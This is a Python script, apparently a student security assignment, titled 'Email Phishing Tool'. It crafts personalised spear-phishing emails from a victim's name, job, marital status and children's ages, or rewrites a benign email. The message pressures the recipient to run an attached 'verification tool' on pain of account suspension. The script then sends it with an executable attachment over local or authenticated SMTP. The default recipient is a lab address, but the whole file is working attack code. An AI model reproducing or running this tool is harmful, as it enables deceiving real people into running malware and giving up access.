# Aliza Lazar – 336392899
# Raz Cohen – 208008995
import os
import re
import smtplib
import html
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def load_benign_email(source):
    if os.path.isfile(source):
        with open(source, 'r', encoding='utf-8') as f:
            return f.read()
    elif source.startswith("http://") or source.startswith("https://"):
        response = requests.get(source)
        return response.text
    else:
        return source


def rewrite_benign_to_phishing_html(benign_text, mail_service, victim_name="User"):
    # Replace greeting name with victim's name if present
    lines = benign_text.splitlines()
    new_lines = []
    greeting_pattern = re.compile(r'(?i)\b(Dear|Hi|Hello|Hey)\s+([A-Za-z]+)([,\s<]*)')
    name_inline_pattern = re.compile(r'\b([A-Z][a-z]+)\s+[-–:]')  # e.g., Michael – urgent

    for line in lines:
        # Replace explicit greeting (e.g., Hi Michael)
        line = greeting_pattern.sub(rf'\1 {victim_name}\3', line)
        # Replace inline name references (e.g., Michael – something)
        line = name_inline_pattern.sub(rf'{victim_name} -', line)
        safe_line = html.escape(line, quote=True)
        new_lines.append(safe_line)

    # Construct minimal HTML body with preserved structure
    html_content = "<br>\n".join(new_lines)

    return f"""
    <html>
    <body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f9f9f9; color: #333; padding: 20px;">
        <div style="background-color: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); max-width: 600px; margin: auto;">
            {html_content}
            <br><br>
            <strong>Note:</strong> Please open the attached file and follow the instructions carefully.
        </div>
    </body>
    </html>
    """


def generate_phishing_email(username, mail_service, title, job_title, status, kids):
    def format_kids_message(kids):
        if not kids:
            return ""
        ages = [int(age.strip()) for age in kids.split(",") if age.strip().isdigit()]
        if not ages:
            return ""
        if len(ages) == 1:
            return f"especially with a young child aged {ages[0]}"
        return f"especially with children aged between {min(ages)} and {max(ages)}"

    kids_note = format_kids_message(kids)

    email_html = f"""
    <html>
    <head>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: #f9f9f9;
                color: #333;
                padding: 20px;
            }}
            .email-container {{
                background-color: #ffffff;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                max-width: 600px;
                margin: auto;
            }}
            .header {{
                background-color: #0073e6;
                padding: 10px;
                text-align: center;
                color: white;
                font-size: 18px;
                font-weight: bold;
                border-radius: 6px 6px 0 0;
            }}
            .notice {{
                font-size: 14px;
                color: #d8000c;
                background-color: #ffdddd;
                padding: 10px;
                border-radius: 5px;
                margin-top: 10px;
            }}
            .footer {{
                font-size: 12px;
                color: #888;
                margin-top: 30px;
                text-align: center;
            }}
        </style>
    </head>
    <body>
        <div class="email-container">
            <div class="header">
                Internal Security Verification Required
            </div><br>

            <p>Dear {title} {username},</p>

            <p>As a trusted {job_title} in our organization, and considering your {status} status{(" - " + kids_note) if kids_note else ""}, we kindly ask you to complete a one-time security verification.</p>

            <p>Our internal monitoring systems have flagged inconsistencies in your last credentials sync. To avoid disruptions to your {mail_service} services, please run the attached verification tool before Friday.</p>

            <div class="notice">
                Failure to complete this step in time may lead to temporary access suspension.
            </div>

            <p>If you experience any issues, please contact the internal IT security team immediately.</p>

            <div class="footer">
                © 2025 SecureMail Information Security Division · Internal Notification<br>
                Please do not reply to this email.
            </div>
        </div>
    </body>
    </html>
    """
    return email_html


def send_email(from_email, to_email, subject, body_text, use_local=True, smtp_info=None):
    # Outer message: mixed = text + attachments
    msg = MIMEMultipart("mixed")
    msg["Subject"] = subject
    msg["From"] = from_email
    msg["To"] = to_email

    # Inner part: alternative = HTML (or text fallback)
    alternative_part = MIMEMultipart("alternative")
    html_part = MIMEText(body_text, "html")
    alternative_part.attach(html_part)

    # Attach HTML container to outer message
    msg.attach(alternative_part)

    # Attach the file
    attachment_path = "attachment" # or "attachment.exe" if you're on Windows
    if os.path.exists(attachment_path):
        with open(attachment_path, "rb") as f:
            attached = MIMEApplication(f.read(), _subtype="octet-stream")
            attached.add_header("Content-Disposition", "attachment", filename=os.path.basename(attachment_path))
            msg.attach(attached)
        print(f"[*] Attached file: {attachment_path}")
    else:
        print("[!] Attachment file not found – skipping.")

    try:
        if use_local:
            with smtplib.SMTP("localhost", 25) as server:
                server.sendmail(from_email, [to_email], msg.as_string())
        else:
            with smtplib.SMTP(smtp_info["host"], smtp_info["port"]) as server:
                server.starttls()
                server.login(smtp_info["user"], smtp_info["pass"])
                server.sendmail(from_email, [to_email], msg.as_string())
        print(f"\nEmail sent successfully to {to_email}")
    except Exception as e:
        print(f"\nFailed to send email: {e}")

if __name__ == "__main__":
    print("=== Email Phishing Tool ===")
    benign_input = input("Enter benign email (string, .txt path, URL, or leave empty to generate manually): ").strip()

    if benign_input:
        benign_text = load_benign_email(benign_input)
        username = input("Victim's name: ")
        mail_service = input("Mail service (e.g., Gmail): ")
        phishing_body = rewrite_benign_to_phishing_html(benign_text, mail_service, victim_name=username)
    else:
        username = input("Victim's name: ")
        mail_service = input("Mail service (e.g., Gmail): ")
        title = input("Title (Mr./Ms./Dr.): ")
        job_title = input("Job title: ")
        status = input("Personal status: ").lower()
        has_kids = input("Has kids? (y/N): ").lower()
        kids_ages = input("Enter kids' ages (comma-separated): ") if has_kids in ("y", "yes") else ""
        phishing_body = generate_phishing_email(username, mail_service, title, job_title, status, kids_ages)

    print("\n--- Phishing Email Preview ---\n")
    print(phishing_body)

    send_now = input("\nSend this email? (y/N): ").lower()
    if send_now in ("y", "yes"):
        from_email = input("From (e.g., joseph@company.com): ")
        to_email = input("To [default: victim@victim.local]: ") or "victim@victim.local"

        mode = input("Use local Postfix? (Y/n): ").lower()
        use_local = (mode != "no" and mode != "n")

        smtp_info = {}
        if not use_local:
            smtp_info["host"] = input("SMTP server (e.g., smtp.mail.com): ")
            smtp_info["port"] = int(input("SMTP port (e.g., 587): "))
            smtp_info["user"] = input("SMTP username: ")
            smtp_info["pass"] = input("SMTP password: ")

        subject = "Important: Immediate Action Required" if benign_input else "Account Security Update"
        send_email(from_email, to_email, subject, phishing_body, use_local, smtp_info if not use_local else None)